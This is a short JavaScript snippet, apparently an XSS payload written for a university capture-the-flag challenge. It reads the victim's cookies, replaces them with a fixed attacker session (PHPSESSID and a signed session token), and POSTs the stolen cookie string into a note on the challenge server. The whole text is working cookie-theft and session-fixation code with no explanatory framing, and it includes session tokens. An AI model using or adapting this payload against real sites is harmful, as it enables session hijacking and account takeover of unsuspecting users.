let x = document.cookie;
document.cookie = "CHALBROKER_USER_ID=dmb9589; TESTCOOKIE=1234; PHPSESSID=n9q6t2sofgli4bslcbha4ev6c5; session=.eJwtzrERwzAIAMBdqF0gJCHhZXyA4JzWjqtcdk-Tn-A_cOQV9wn7-3pig-O1YAdFHbHmUNeOK5WqNEaJrFQ0ZsEUFDaLGracwkr3FBZXVZkWo0xKRSq5InVZFOXO4dwoRxVvblTqyNorUjREG414Eis7demwwXPH9c-Yw_cHjzYw2g.Y9aiRQ.i0lT2QzfsX0w02pClwj0r3mjqV4";
fetch('http://offsec-chalbroker.osiris.cyber.nyu.edu:12345/note/new', {
credentials:'include',
headers: {"Content-Type": "application/x-www-form-urlencoded"},
method: 'POST',
mode: 'no-cors',
body: "title=exp456&content=" + x + "&submit=save"
});
